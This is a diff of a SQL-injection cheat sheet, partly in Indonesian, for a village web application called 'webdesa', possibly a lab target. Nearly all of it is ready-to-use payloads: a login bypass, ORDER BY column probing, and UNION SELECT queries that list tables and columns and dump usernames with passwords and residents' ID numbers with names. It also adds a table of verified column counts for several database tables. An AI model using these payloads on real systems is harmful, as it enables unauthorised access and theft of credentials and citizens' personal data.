@@ -18,44 +18,50 @@ username: admin'-- -
 password: [kosong]
 ```
 
-### Cek Kolom
+### Cek Kolom (warga = 13)
 ```
-nik: ' ORDER BY 12-- -
+nik: ' ORDER BY 13-- -   (OK = 13 kolom)
+nik: ' ORDER BY 14-- -   (ERROR)
 ```
 
 ### UNION SELECT
 ```
-nik: ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
+nik: ' ORDER BY 13-- -
+```
+
+### UNION SELECT (13 columns)
+```
+nik: ' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
 ```
 
 ### Version
 ```
-nik: ' UNION SELECT 1,version(),3,4,5,6,7,8,9,10,11,12-- -
+nik: ' UNION SELECT 1,version(),3,4,5,6,7,8,9,10,11,12,13-- -
 ```
 
 ### Database Name
 ```
-nik: ' UNION SELECT 1,database(),3,4,5,6,7,8,9,10,11,12-- -
+nik: ' UNION SELECT 1,database(),3,4,5,6,7,8,9,10,11,12,13-- -
 ```
 
 ### List Tables
 ```
-nik: ' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.tables WHERE table_schema='webdesa'-- -
+nik: ' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9,10,11,12,13 FROM information_schema.tables WHERE table_schema='webdesa'-- -
 ```
 
 ### List Columns (users)
 ```
-nik: ' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9,10,11,12 FROM information_schema.columns WHERE table_name='users'-- -
+nik: ' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7,8,9,10,11,12,13 FROM information_schema.columns WHERE table_name='users'-- -
 ```
 
 ### Dump Users
 ```
-nik: ' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4,5,6,7,8,9,10,11,12 FROM users-- -
+nik: ' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4,5,6,7,8,9,10,11,12,13 FROM users-- -
 ```
 
 ### Dump Warga
 ```
-nik: ' UNION SELECT 1,GROUP_CONCAT(nik,0x3a,nama SEPARATOR 0x0a),3,4,5,6,7,8,9,10,11,12 FROM warga-- -
+nik: ' UNION SELECT 1,GROUP_CONCAT(nik,0x3a,nama SEPARATOR 0x0a),3,4,5,6,7,8,9,10,11,12,13 FROM warga-- -
 ```
 
 ### Error-Based
@@ -103,11 +109,21 @@ nik: ' AND 1=2-- -  (false)
 /* */
 ```
 
-## Column Count (12)
+## Column Count (Verified)
+
+| Tabel | Kolom | ORDER BY max |
+|-------|-------|-------------|
+| warga | 13 | `ORDER BY 13` OK, `ORDER BY 14` ERROR |
+| berita | 6 | `ORDER BY 6` OK, `ORDER BY 7` ERROR |
+| surat_pengajuan | 12 | `ORDER BY 12` OK, `ORDER BY 13` ERROR |
+| users | 6 | `ORDER BY 6` OK, `ORDER BY 7` ERROR |
+
 ```
-warga table: id, nik, nama, tempat_lahir, tanggal_lahir, jenis_kelamin, alamat, rt, rw, dusun, pekerjaan, status_perkawinan, created_at
+warga columns: id, nik, nama, tempat_lahir, tanggal_lahir, jenis_kelamin, alamat, rt, rw, dusun, pekerjaan, status_perkawinan, created_at (13)
+berita columns: id, judul, isi, penulis, diterbitkan, created_at (6)
+surat_pengajuan columns: id, warga_id, jenis_surat, keperluan, nama_usaha, alamat_usaha, nama_pasangan, status, catatan_admin, tanggal_ajuan, tanggal_selesai, diproses_oleh (12)
+users columns: id, username, password, nama_lengkap, role, created_at (6)
 ```
-Note: Actually 13 columns in warga table, test with ORDER BY
 
 ## File Locations
 ```
